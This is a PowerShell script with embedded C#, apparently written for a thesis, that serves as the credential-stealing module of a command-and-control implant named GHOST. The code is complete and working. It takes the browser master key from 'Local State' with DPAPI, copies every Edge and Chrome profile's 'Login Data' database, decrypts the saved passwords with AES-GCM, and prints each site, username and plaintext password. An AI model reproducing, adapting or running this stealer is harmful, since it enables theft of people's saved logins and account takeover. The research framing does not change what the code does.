# GHOST - browser credential recovery (Edge / Chrome)  [MITRE T1555.003]
#
# This file is the single source of truth for the script the implant embeds:
# the LIBRARY section (everything above the DRIVER marker) is compiled into
# src/c2.cpp as XSW string chunks and shipped via -EncodedCommand. Keep both
# in sync - the C++ chunks are generated from this file.
#
# Stock-Windows design (no third-party dependencies):
#   - SQLite access   : winsqlite3.dll (ships in System32, Win10/11)
#   - AES-256-GCM     : bcrypt.dll CNG (Chrome >= v80 "v10" scheme)
#   - Master key      : os_crypt.encrypted_key in "Local State", DPAPI CurrentUser
#   - Legacy pre-v80  : plain DPAPI on password_value
# Limitation (documented for the thesis): Chrome >= 127 app-bound encryption
# ("v20" blobs) is detected and reported as not recoverable; Edge is unaffected.

Add-Type -AssemblyName System.Security | Out-Null

$GHOST_CS = '
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;

public static class GhostSql {
    [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
    private static extern int sqlite3_open_v2(byte[] filename, out IntPtr db, int flags, IntPtr vfs);
    [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
    private static extern int sqlite3_prepare_v2(IntPtr db, byte[] query, int nByte, out IntPtr stmt, IntPtr tail);
    [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
    private static extern int sqlite3_step(IntPtr stmt);
    [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
    private static extern IntPtr sqlite3_column_text(IntPtr stmt, int col);
    [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
    private static extern IntPtr sqlite3_column_blob(IntPtr stmt, int col);
    [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
    private static extern int sqlite3_column_bytes(IntPtr stmt, int col);
    [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
    private static extern int sqlite3_finalize(IntPtr stmt);
    [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
    private static extern int sqlite3_close(IntPtr db);

    private static string ColumnText(IntPtr stmt, int col) {
        IntPtr p = sqlite3_column_text(stmt, col);
        if (p == IntPtr.Zero) { return string.Empty; }
        int n = sqlite3_column_bytes(stmt, col);
        byte[] b = new byte[n];
        Marshal.Copy(p, b, 0, n);
        return Encoding.UTF8.GetString(b);
    }

    // Runs one statement; rows come back as col0 + \u0001 + col1 + \u0001 + col2-blob-base64
    public static string[] Query(string dbPath, string sql, int openFlags = 1) {
        var rows = new List<string>();
        byte[] pathB = Encoding.UTF8.GetBytes(dbPath + "\0");
        byte[] sqlB = Encoding.UTF8.GetBytes(sql + "\0");
        IntPtr db, stmt;
        if (sqlite3_open_v2(pathB, out db, openFlags, IntPtr.Zero) != 0) {
            sqlite3_close(db);
            return rows.ToArray();
        }
        if (sqlite3_prepare_v2(db, sqlB, sqlB.Length, out stmt, IntPtr.Zero) == 0) {
            while (sqlite3_step(stmt) == 100) {
                string c2 = string.Empty;
                IntPtr bp = sqlite3_column_blob(stmt, 2);
                int bn = sqlite3_column_bytes(stmt, 2);
                if (bp != IntPtr.Zero && bn > 0) {
                    byte[] bb = new byte[bn];
                    Marshal.Copy(bp, bb, 0, bn);
                    c2 = Convert.ToBase64String(bb);
                }
                rows.Add(ColumnText(stmt, 0) + "\u0001" + ColumnText(stmt, 1) + "\u0001" + c2);
            }
            sqlite3_finalize(stmt);
        }
        sqlite3_close(db);
        return rows.ToArray();
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct AuthInfo {
        public int cbSize;
        public int dwInfoVersion;
        public IntPtr pbNonce; public int cbNonce;
        public IntPtr pbAuthData; public int cbAuthData;
        public IntPtr pbTag; public int cbTag;
        public IntPtr pbMacContext; public int cbMacContext;
        public int cbAAD;
        public ulong cbData;
        public int dwFlags;
    }

    [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
    private static extern int BCryptOpenAlgorithmProvider(out IntPtr phAlg, string pszAlgId, string pszImplementation, int dwFlags);
    [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
    private static extern int BCryptSetProperty(IntPtr hObject, string pszProp, byte[] pbInput, int cbInput, int dwFlags);
    [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
    private static extern int BCryptGenerateSymmetricKey(IntPtr hAlg, out IntPtr phKey, IntPtr pbKeyObject, int cbKeyObject, byte[] pbSecret, int cbSecret, int dwFlags);
    [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
    private static extern int BCryptDecrypt(IntPtr hKey, byte[] pbInput, int cbInput, ref AuthInfo pInfo, IntPtr pbIV, int cbIV, byte[] pbOutput, int cbOutput, out int pcbResult, int dwFlags);
    [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
    private static extern int BCryptDestroyKey(IntPtr hKey);
    [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
    private static extern int BCryptCloseAlgorithmProvider(IntPtr hAlg, int dwFlags);

    // Chrome v10/v11 blob: magic[3] || nonce[12] || ciphertext || tag[16]
    public static string DecryptGcm(byte[] key, byte[] blob) {
        if (key == null || key.Length != 32 || blob == null || blob.Length < 31) { return null; }
        byte[] nonce = new byte[12];
        Array.Copy(blob, 3, nonce, 0, 12);
        int ctLen = blob.Length - 15 - 16;
        byte[] ct = new byte[ctLen];
        byte[] tag = new byte[16];
        Array.Copy(blob, 15, ct, 0, ctLen);
        Array.Copy(blob, 15 + ctLen, tag, 0, 16);

        IntPtr hAlg, hKey = IntPtr.Zero;
        if (BCryptOpenAlgorithmProvider(out hAlg, "AES", null, 0) != 0) { return null; }
        int st = 1;
        byte[] gcmName = Encoding.Unicode.GetBytes("ChainingModeGCM\0");
        if (BCryptSetProperty(hAlg, "ChainingMode", gcmName, gcmName.Length, 0) == 0) {
            st = BCryptGenerateSymmetricKey(hAlg, out hKey, IntPtr.Zero, 0, key, key.Length, 0);
        }
        if (st != 0) { BCryptCloseAlgorithmProvider(hAlg, 0); return null; }

        AuthInfo info = new AuthInfo();
        info.cbSize = Marshal.SizeOf(typeof(AuthInfo));
        info.dwInfoVersion = 1;
        info.pbNonce = Marshal.AllocHGlobal(12);
        Marshal.Copy(nonce, 0, info.pbNonce, 12);
        info.cbNonce = 12;
        info.pbTag = Marshal.AllocHGlobal(16);
        Marshal.Copy(tag, 0, info.pbTag, 16);
        info.cbTag = 16;
        byte[] plain = new byte[ctLen];
        int done = 0;
        st = BCryptDecrypt(hKey, ct, ctLen, ref info, IntPtr.Zero, 0, plain, plain.Length, out done, 0);
        Marshal.FreeHGlobal(info.pbNonce);
        Marshal.FreeHGlobal(info.pbTag);
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        if (st != 0) { return null; }
        return Encoding.UTF8.GetString(plain, 0, done);
    }
}
'
Add-Type -TypeDefinition $GHOST_CS

function Get-GhostBrowserData([string]$userDataRoot) {
    $lines = New-Object System.Collections.Generic.List[string]
    $lsPath = Join-Path $userDataRoot 'Local State'
    if (-not (Test-Path -LiteralPath $lsPath)) { return $lines }
    $key = $null
    try {
        $json = Get-Content -LiteralPath $lsPath -Raw | ConvertFrom-Json
        $keyB64 = $json.os_crypt.encrypted_key
        if (-not $keyB64) { return $lines }
        $keyBlob = [Convert]::FromBase64String($keyB64)
        if ($keyBlob.Length -le 5) { return $lines }
        $key = [System.Security.Cryptography.ProtectedData]::Unprotect(
                   $keyBlob[5..($keyBlob.Length - 1)], $null,
                   [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    } catch { return $lines }
    if (-not $key -or $key.Length -ne 32) { return $lines }

    Get-ChildItem -LiteralPath $userDataRoot -Directory -ErrorAction SilentlyContinue | ForEach-Object {
        $loginData = Join-Path $_.FullName 'Login Data'
        if (-not (Test-Path -LiteralPath $loginData)) { return }
        $tmp = [System.IO.Path]::GetTempFileName()
        try {
            Copy-Item -LiteralPath $loginData -Destination $tmp -Force
            $rows = [GhostSql]::Query($tmp, 'SELECT origin_url, username_value, password_value FROM logins')
            foreach ($row in $rows) {
                $parts = $row.Split([char]1)
                if ($parts.Length -lt 3 -or -not $parts[2]) { continue }
                $url = $parts[0]
                $user = $parts[1]
                try { $blob = [Convert]::FromBase64String($parts[2]) } catch { continue }
                if ($blob.Length -le 15) { continue }
                $magic = [System.Text.Encoding]::ASCII.GetString($blob[0..2])
                if ($magic -eq 'v20') {
                    $lines.Add("$url | $user | [app-bound encrypted - not recoverable]")
                    continue
                }
                if ($magic -eq 'v10' -or $magic -eq 'v11') {
                    $plain = [GhostSql]::DecryptGcm($key, $blob)
                    if ($plain) { $lines.Add("$url | $user | $plain") }
                    continue
                }
                try {
                    $dp = [System.Security.Cryptography.ProtectedData]::Unprotect(
                              $blob, $null,
                              [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
                    $lines.Add("$url | $user | $([System.Text.Encoding]::UTF8.GetString($dp))")
                } catch { }
            }
        } catch { }
        finally { Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue }
    }
    return $lines
}

# === DRIVER (not embedded in implant - the implant calls the function itself) ===
$ghostOut = New-Object System.Collections.Generic.List[string]
$ghostOut.AddRange((Get-GhostBrowserData (Join-Path $env:LOCALAPPDATA 'Microsoft\Edge\User Data')))
$ghostOut.AddRange((Get-GhostBrowserData (Join-Path $env:LOCALAPPDATA 'Google\Chrome\User Data')))
if ($ghostOut.Count -eq 0) { '[no recoverable entries]' } else { $ghostOut }
